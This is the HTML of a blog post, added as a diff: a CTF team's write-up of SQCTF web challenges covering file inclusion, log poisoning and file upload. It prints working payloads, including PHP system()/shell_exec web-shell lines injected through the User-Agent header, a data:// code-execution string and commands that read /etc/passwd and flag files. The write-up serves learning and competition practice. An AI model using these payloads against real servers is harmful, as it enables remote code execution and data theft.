@@ -1,0 +1,1195 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  
+  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};</script>
+  
+  
+  <title>
+    SQCTF |
+    
+    Flight-star&#39;blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="Flitar战队write-up战队信息：名称：Flitar排名：220WEBezGame奶奶滴，玩了四次才过 baby include考察点：日志注入，文件读取这是我第一次接触日志注入，希望下次接触新事物也能做出来！我的步骤：1.测试能不能读取&#x2F;etc&#x2F;passwd发现可以，存在注入漏洞！  2.尝试遍历..&#x2F;：发现可以，但是没什么用 3.尝试伪协议：1.尝试直接读">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQCTF">
+<meta property="og:url" content="http://example.com/2025/04/07/SQCTF/index.html">
+<meta property="og:site_name" content="Flight-star&#39;blog">
+<meta property="og:description" content="Flitar战队write-up战队信息：名称：Flitar排名：220WEBezGame奶奶滴，玩了四次才过 baby include考察点：日志注入，文件读取这是我第一次接触日志注入，希望下次接触新事物也能做出来！我的步骤：1.测试能不能读取&#x2F;etc&#x2F;passwd发现可以，存在注入漏洞！  2.尝试遍历..&#x2F;：发现可以，但是没什么用 3.尝试伪协议：1.尝试直接读">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/image-20250407230918710-1744038560504-1.png">
+<meta property="og:image" content="http://example.com/images/image-20250407233934080-1744040374822-3.png">
+<meta property="og:image" content="http://example.com/images/image-20250407234451628-1744040692669-5.png">
+<meta property="og:image" content="http://example.com/images/image-20250407235606321-1744041367050-7.png">
+<meta property="og:image" content="http://example.com/images/image-20250408000440937-1744041881742-9.png">
+<meta property="og:image" content="http://example.com/images/image-20250408000513985-1744041914748-11.png">
+<meta property="og:image" content="http://example.com/images/image-20250408003009149-1744043409940-15.png">
+<meta property="og:image" content="http://example.com/images/image-20250408003000462-1744043401231-13.png">
+<meta property="og:image" content="http://example.com/images/image-20250408003142227-1744043503171-17.png">
+<meta property="og:image" content="http://example.com/images/image-20250408003725342-1744043846152-19.png">
+<meta property="og:image" content="http://example.com/images/image-20250408005318925-1744044799735-21.png">
+<meta property="og:image" content="http://example.com/images/image-20250408083221450-1744072342508-1.png">
+<meta property="og:image" content="http://example.com/images/image-20250408083250434-1744072371182-3.png">
+<meta property="og:image" content="http://example.com/images/image-20250408083742015-1744072662983-5.png">
+<meta property="og:image" content="http://example.com/images/image-20250408083828947-1744072710288-7.png">
+<meta property="og:image" content="http://example.com/images/image-20250408084339355-1744073020690-9.png">
+<meta property="og:image" content="http://example.com/images/image-20250408084825212-1744073306190-11.png">
+<meta property="og:image" content="http://example.com/images/image-20250408084852504-1744073333204-13.png">
+<meta property="og:image" content="http://example.com/images/image-20250408085946844-1744073987674-15.png">
+<meta property="og:image" content="http://example.com/images/image-20250408090247805-1744074169380-17.png">
+<meta property="og:image" content="http://example.com/images/image-20250408090335929-1744074216654-19.png">
+<meta property="og:image" content="http://example.com/images/image-20250408090658692-1744074419793-21.png">
+<meta property="og:image" content="http://example.com/images/image-20250408091830577-1744075112016-23.png">
+<meta property="og:image" content="http://example.com/images/image-20250408094524367-1744076725250-27.png">
+<meta property="og:image" content="http://example.com/images/image-20250408094511045-1744076711779-25.png">
+<meta property="og:image" content="http://example.com/images/image-20250408141645164.png">
+<meta property="og:image" content="http://example.com/images/image-20250408193352670-1744112034202-29.png">
+<meta property="og:image" content="http://example.com/images/image-20250408193450595-1744112091386-31.png">
+<meta property="og:image" content="http://example.com/images/image-20250408193956901-1744112398117-33.png">
+<meta property="og:image" content="http://example.com/images/image-20250408233549645-1744126550421-39.png">
+<meta property="og:image" content="http://example.com/images/image-20250408235134639-1744127495734-43.png">
+<meta property="og:image" content="http://example.com/images/image-20250408235623056-1744127783926-45.png">
+<meta property="og:image" content="http://example.com/images/image-20250408234330709-1744127011675-41.png">
+<meta property="og:image" content="http://example.com/images/image-20250409000537379-1744128339395-47.png">
+<meta property="og:image" content="http://example.com/images/image-20250409000739850-1744128460816-49.png">
+<meta property="og:image" content="http://example.com/images/image-20250409190601919-1744196762944-1.png">
+<meta property="og:image" content="http://example.com/images/image-20250409230055333-1744210856427-3.png">
+<meta property="og:image" content="http://example.com/images/image-20250409230836899-1744211317808-5.png">
+<meta property="og:image" content="http://example.com/images/image-20250410125022902-1744260623677-1.png">
+<meta property="og:image" content="http://example.com/images/image-20250410125212000-1744260733248-3.png">
+<meta property="og:image" content="http://example.com/images/image-20250410125646788-1744261007635-5.png">
+<meta property="og:image" content="http://example.com/images/image-20250410173520850-1744277721506-17.png">
+<meta property="og:image" content="http://example.com/images/image-20250410170635239-1744275995959-11.png">
+<meta property="og:image" content="http://example.com/images/image-20250410172901401-1744277342056-15.png">
+<meta property="og:image" content="http://example.com/images/image-20250410185151412-1744282312719-19.png">
+<meta property="og:image" content="http://example.com/images/image-20250410190223578-1744282944709-21.png">
+<meta property="og:image" content="http://example.com/images/image-20250410192854983-1744284535673-23.png">
+<meta property="og:image" content="http://example.com/images/image-20250410193201002-1744284722358-25.png">
+<meta property="og:image" content="http://example.com/images/image-20250410195349490-1744286030269-27.png">
+<meta property="og:image" content="http://example.com/images/image-20250410201534447-1744287335254-35-1744287335571-37.png">
+<meta property="og:image" content="http://example.com/images/image-20250410195441105-1744286081834-29.png">
+<meta property="og:image" content="http://example.com/images/image-20250410195906816-1744286347734-31.png">
+<meta property="og:image" content="http://example.com/images/image-20250410201225378-1744287145968-33.png">
+<meta property="og:image" content="http://example.com/images/image-20250410205027535-1744289429509-39.png">
+<meta property="og:image" content="http://example.com/images/image-20250410211657524-1744291018526-41.png">
+<meta property="og:image" content="http://example.com/images/image-20250410212333293-1744291414420-43.png">
+<meta property="og:image" content="http://example.com/images/image-20250411152252559-1744356173541-4.png">
+<meta property="og:image" content="http://example.com/images/image-20250411152343667-1744356224526-6.png">
+<meta property="og:image" content="http://example.com/images/image-20250411152436844-1744356277464-8.png">
+<meta property="og:image" content="http://example.com/images/image-20250411152520272-1744356321310-10.png">
+<meta property="og:image" content="http://example.com/images/image-20250411152840686-1744356521715-12.png">
+<meta property="og:image" content="http://example.com/images/image-20250411222655672-1744381616403-16.png">
+<meta property="og:image" content="http://example.com/images/image-20250411222930207-1744381771192-18.png">
+<meta property="og:image" content="http://example.com/images/image-20250411171941681-1744363182435-14.png">
+<meta property="og:image" content="http://example.com/images/image-20250413091117865-1744506678514-1.png">
+<meta property="og:image" content="http://example.com/images/image-20250413091151566-1744506712238-3.png">
+<meta property="og:image" content="http://example.com/images/image-20250413102039282-1744510840106-5.png">
+<meta property="og:image" content="http://example.com/images/image-20250413103600446.png">
+<meta property="og:image" content="http://example.com/images/image-20250413103540991-1744511742018-7.png">
+<meta property="og:image" content="http://example.com/images/image-20250413112404453-1744514645250-9.png">
+<meta property="article:published_time" content="2025-04-07T14:56:10.000Z">
+<meta property="article:modified_time" content="2025-04-13T14:56:43.935Z">
+<meta property="article:author" content="Flight-star">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/image-20250407230918710-1744038560504-1.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Flight-star'blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.0.1/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff5252" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+         M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="#ff5252" />
+        </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/">Home</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/archives">Archives</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/about">About</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/friend">Friend</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="SQCTF">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">SQCTF</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-SQCTF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/04/07/SQCTF/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-04-07T14:56:10.000Z" itemprop="datePublished">2025-04-07</time>
+    <time style="display: none;" id="post-update-time">2025-04-13</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="Flitar战队write-up"><a href="#Flitar战队write-up" class="headerlink" title="Flitar战队write-up"></a>Flitar战队write-up</h1><h1 id="战队信息："><a href="#战队信息：" class="headerlink" title="战队信息："></a>战队信息：</h1><h3 id="名称：Flitar"><a href="#名称：Flitar" class="headerlink" title="名称：Flitar"></a>名称：Flitar</h3><h3 id="排名：220"><a href="#排名：220" class="headerlink" title="排名：220"></a>排名：220</h3><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h1 id="ezGame"><a href="#ezGame" class="headerlink" title="ezGame"></a>ezGame</h1><p>奶奶滴，玩了四次才过</p>
+<h1 id="baby-include"><a href="#baby-include" class="headerlink" title="baby include"></a><code>baby include</code></h1><h3 id="考察点：日志注入，文件读取"><a href="#考察点：日志注入，文件读取" class="headerlink" title="考察点：日志注入，文件读取"></a><strong>考察点：<font color="red">日志注入，文件读取</font></strong></h3><h3 id="这是我第一次接触日志注入，希望下次接触新事物也能做出来！"><a href="#这是我第一次接触日志注入，希望下次接触新事物也能做出来！" class="headerlink" title="这是我第一次接触日志注入，希望下次接触新事物也能做出来！"></a>这是我第一次接触日志注入，希望下次接触新事物也能做出来！</h3><h3 id="我的步骤："><a href="#我的步骤：" class="headerlink" title="我的步骤："></a>我的步骤：</h3><h4 id="1-测试能不能读取-etc-passwd"><a href="#1-测试能不能读取-etc-passwd" class="headerlink" title="1.测试能不能读取&#x2F;etc&#x2F;passwd"></a>1.测试能不能读取&#x2F;etc&#x2F;passwd</h4><p>发现可以，存在注入漏洞！</p>
+<p><img src="/../images/image-20250407230918710-1744038560504-1.png" alt="image-20250407230918710"></p>
+<h4 id="2-尝试遍历-："><a href="#2-尝试遍历-：" class="headerlink" title="2.尝试遍历..&#x2F;："></a>2.尝试遍历..&#x2F;：</h4><p>发现可以，但是没什么用</p>
+<h4 id="3-尝试伪协议："><a href="#3-尝试伪协议：" class="headerlink" title="3.尝试伪协议："></a>3.尝试伪协议：</h4><h5 id="1-尝试直接读取filter："><a href="#1-尝试直接读取filter：" class="headerlink" title="1.尝试直接读取filter："></a>1.尝试直接读取filter：</h5><p>被禁了，查询了好久，发现我们可以尝试大写</p>
+<p><strong>大小写不会影响伪协议</strong></p>
+<p><img src="/../images/image-20250407233934080-1744040374822-3.png" alt="image-20250407233934080"></p>
+<h5 id="2-尝试读取flag-php"><a href="#2-尝试读取flag-php" class="headerlink" title="2.尝试读取flag.php"></a>2.尝试读取flag.php</h5><p>可恶啊！！被这个坑了一天时间，一直在想怎么绕过后缀，搜了一辈子，尝试了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$</span><br><span class="line">%</span><br><span class="line">[]</span><br><span class="line">@....</span><br></pre></td></tr></table></figure>
+
+<p><strong>各种各样的玩意来尝试绕过，都失败了</strong></p>
+<h5 id="3-测试其他伪协议，测试data-input伪协议来RCE"><a href="#3-测试其他伪协议，测试data-input伪协议来RCE" class="headerlink" title="3.测试其他伪协议，测试data/input伪协议来RCE"></a>3.测试其他伪协议，测试<code>data/input</code>伪协议来RCE</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DATA://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOz8%2b</span><br><span class="line"></span><br><span class="line">也就是：DATA://text/plain,&lt;?php system(&quot;ls&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250407234451628-1744040692669-5.png" alt="image-20250407234451628l"></p>
+<p>哈？，直接<code>allow_url_include=0</code>了。。。那<code>input</code>函数也不行了。</p>
+<p>陷入了僵局。</p>
+<p>我在这里消耗一天，满课，一直没有时间来证明我的猜想。</p>
+<h5 id="4-柳暗花明又一村！"><a href="#4-柳暗花明又一村！" class="headerlink" title="4.柳暗花明又一村！"></a>4.柳暗花明又一村！</h5><p>总结目前困境：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>无法读取flag.php(<span class="string">&quot;甚至都不知道是否存在这个文件&quot;</span>)</span><br><span class="line"><span class="number">2.</span>无法RCE，allow_url_include=<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>真的无法 <code>RCE</code> 吗？</p>
+<p>我突发奇想，是否可以别的<code>RCE</code>，询问一下ai，居然真的有！</p>
+<p><img src="/../images/image-20250407235606321-1744041367050-7.png" alt="image-20250407235606321"></p>
+<h5 id="5-日志注入"><a href="#5-日志注入" class="headerlink" title="5.日志注入"></a>5.日志注入</h5><p>我们有两种方法:</p>
+<p><strong>1.抓包，在BP里面修改</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    这个失败了，换一个代码（不知道为什么 <span class="string">&#x27;system&#x27;</span> 老是不行，就换 <span class="string">&#x27;shell_exec&#x27;</span></span><br><span class="line"></span><br><span class="line">User-Agent: <span class="meta">&lt;?=</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ls&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>2.通过cmd:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -A <span class="string">&quot;&lt;?= shell_exec(&#x27;ls&#x27;); ?&gt;&quot;</span> http:<span class="comment">//challenge.qsnctf.com:32272/</span></span><br><span class="line"></span><br><span class="line">curl -A <span class="string">&quot;&lt;?= shell_exec(&#x27;cat flag.php&#x27;); ?&gt;&quot;</span> http:<span class="comment">//challenge.qsnctf.com:32272/</span></span><br></pre></td></tr></table></figure>
+
+<p><code>ls</code>发现确实是有<code>flag.php</code></p>
+<h5 id="6-通过下面代码来监听："><a href="#6-通过下面代码来监听：" class="headerlink" title="6.通过下面代码来监听："></a>6.通过下面代码来监听：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?look=file:<span class="comment">///var/log/nginx/access.log</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>失败页面</strong>：</p>
+<p><img src="/../images/image-20250408000440937-1744041881742-9.png" alt="image-20250408000440937"></p>
+<p>好像是无法读取system函数</p>
+<p><strong>成功页面</strong>：</p>
+<p><img src="/../images/image-20250408000513985-1744041914748-11.png" alt="s"></p>
+<h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><h2 id="很简单"><a href="#很简单" class="headerlink" title="很简单"></a>很简单</h2><h3 id="流程："><a href="#流程：" class="headerlink" title="流程："></a>流程：</h3><h4 id="1-BP抓包修改为php，直接上传成功。。。太简单了吧"><a href="#1-BP抓包修改为php，直接上传成功。。。太简单了吧" class="headerlink" title="1.BP抓包修改为php，直接上传成功。。。太简单了吧"></a>1.<code>BP</code>抓包修改为php，直接上传成功。。。太简单了吧</h4><p><img src="/../images/image-20250408003009149-1744043409940-15.png" alt="image-20250408003009149"></p>
+<h4 id="2-交给剑蚁"><a href="#2-交给剑蚁" class="headerlink" title="2.交给剑蚁"></a>2.交给剑蚁</h4><p><strong>发现找不到flag位置</strong></p>
+<h4 id="3-实在找不到位置，直接RCE好了"><a href="#3-实在找不到位置，直接RCE好了" class="headerlink" title="3.实在找不到位置，直接RCE好了"></a>3.实在找不到位置，直接RCE好了</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;find / -iname &quot;*flag*&quot;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250408003000462-1744043401231-13.png" alt="image-20250408003000462"></p>
+<p><strong>得到：</strong></p>
+<p><img src="/../images/image-20250408003142227-1744043503171-17.png" alt="image-20250408003142227"></p>
+<p><strong>找到一个比较短的，猜测为flag：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;cat /usr/bin/dpkg-buildflags&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>居然不是，那可能在环境变量。</p>
+<h4 id="4-查询环境变量"><a href="#4-查询环境变量" class="headerlink" title="4.查询环境变量"></a>4.查询环境变量</h4><p><img src="/../images/image-20250408003725342-1744043846152-19.png" alt="image-20250408003725342"></p>
+<p><font color="red"><strong>不是哥们</strong></font></p>
+<h4 id="5-只能慢慢找了。。。。"><a href="#5-只能慢慢找了。。。。" class="headerlink" title="5.只能慢慢找了。。。。"></a>5.只能慢慢找了。。。。</h4><p>折磨我这么久，终于找到你了</p>
+<p><img src="/../images/image-20250408005318925-1744044799735-21.png" alt="image-20250408005318925"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查询代码：<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;find / -iname &quot;*fl*&quot;&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">执行代码：<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /ffffffllllaaaagg&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>得到flag：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqctf&#123;<span class="number">35</span>c2011b992f4975a593586a9ee22149&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="商师一日游"><a href="#商师一日游" class="headerlink" title="商师一日游"></a>商师一日游</h1><p><img src="/../images/image-20250408083221450-1744072342508-1.png" alt="image-20250408083221450"></p>
+<h3 id="1-点击源码："><a href="#1-点击源码：" class="headerlink" title="1.点击源码："></a>1.点击源码：</h3><p><img src="/../images/image-20250408083250434-1744072371182-3.png" alt="image-20250408083250434"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--苦苦找寻, 在附近的草丛中发现的你的令牌,</span><br><span class="line">       你成功进入校园 ===&gt;  /atc2cnzd.php</span><br><span class="line">       旅行碎片1: sqctf&#123;--&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-发送cookie"><a href="#2-发送cookie" class="headerlink" title="2.发送cookie"></a>2.发送cookie</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;Cookie: fish=strong&quot;</span> challenge.qsnctf.com:<span class="number">32546</span>/atc2cnzd.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250408083742015-1744072662983-5.png" alt="image-20250408083742015"></p>
+<p>也可以用<code>BP</code>抓包：</p>
+<p><img src="/../images/image-20250408083828947-1744072710288-7.png" alt="image-20250408083828947"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">旅行碎片2: 1063</span><br><span class="line">你继续前进 ===&gt; /atc3oklm.php </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-进入终端，在devtool中找到复活币"><a href="#3-进入终端，在devtool中找到复活币" class="headerlink" title="3.进入终端，在devtool中找到复活币"></a>3.进入终端，在devtool中找到复活币</h3><p>这是啥玩意嘞</p>
+<p><img src="/../images/image-20250408084339355-1744073020690-9.png" alt="image-20250408084339355"></p>
+<p>为什么<code>BP</code>抓包里面看不见呢</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Tourist_fragment3: 0e7d5f</span><br><span class="line">Information: Let&#x27;s fight again ===&gt; /atc4zztg.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4-直接发送-打开-robots-txt"><a href="#4-直接发送-打开-robots-txt" class="headerlink" title="4.直接发送(打开)robots.txt"></a>4.直接发送(打开)robots.txt</h3><p><img src="/../images/image-20250408084825212-1744073306190-11.png" alt="image-20250408084825212"></p>
+<p><img src="/../images/image-20250408084852504-1744073333204-13.png" alt="image-20250408084852504"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Tourist fragment4: 5843a2b</span><br><span class="line"></span><br><span class="line">Next location ===&gt; /atc5uupl.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-正则匹配："><a href="#5-正则匹配：" class="headerlink" title="5.正则匹配："></a>5.正则匹配：</h3><p>由于一个会匹配换行和大小写 <code>(im)</code>,一个只会匹配大小写<code>i</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))</span><br></pre></td></tr></table></figure>
+
+<p>输入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//challenge.qsnctf.com:32546/atc5uupl.php?hhh=%0Aphp%0A</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>(记得，要url编码，不然无法识别)</strong></p>
+<p><img src="/../images/image-20250408085946844-1744073987674-15.png" alt="image-20250408085946844"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">旅行碎片5: c4448a35</span><br><span class="line">你继续前进 ===&gt; /atc6ertg.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="6-POST提交"><a href="#6-POST提交" class="headerlink" title="6.POST提交"></a>6.POST提交</h3><p><img src="/../images/image-20250408090247805-1744074169380-17.png" alt="image-20250408090247805"></p>
+<p>提醒我们要用 <code>POST</code>  提交  <code>auth=Hidden Levels</code></p>
+<p><img src="/../images/image-20250408090335929-1744074216654-19.png" alt="image-20250408090335929">jiede</p>
+<p>解得：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">验证成功, 欢迎来到隐藏关卡: 继续前进</span><br><span class="line">别忘了收集旅行碎片6: 1cd02</span><br></pre></td></tr></table></figure>
+
+<p>sqctf{10630e7d5f5843a2bc4448a351cd02}</p>
+<h3 id="7-执行任意代码？"><a href="#7-执行任意代码？" class="headerlink" title="7.执行任意代码？"></a>7.执行任意代码？</h3><p><img src="/../images/image-20250408090658692-1744074419793-21.png" alt="image-20250408090658692"></p>
+<p>早知道这样子就不做了（bushi）</p>
+<h3 id="8-拼接："><a href="#8-拼接：" class="headerlink" title="8.拼接："></a>8.拼接：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqctf&#123;10630e7d5f5843a2bc4448a351cd02&#125;</span><br><span class="line">错误的？还差哪里呢</span><br></pre></td></tr></table></figure>
+
+<p><strong>看来还是得RCE</strong></p>
+<p>通过剑蚁链接：</p>
+<p><img src="/../images/image-20250408091830577-1744075112016-23.png" alt="image-20250408091830577"></p>
+<p>拼得：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqctf&#123;10630e7d5f5843a2bc4448a351cd0215&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="My-blog"><a href="#My-blog" class="headerlink" title="My blog"></a>My blog</h1><p>直接扫描一下输入账号密码就行了</p>
+<p><img src="/../images/image-20250408094524367-1744076725250-27.png" alt="image-20250408094524367"></p>
+<p><img src="/../images/image-20250408094511045-1744076711779-25.png" alt="image-20250408094511045"></p>
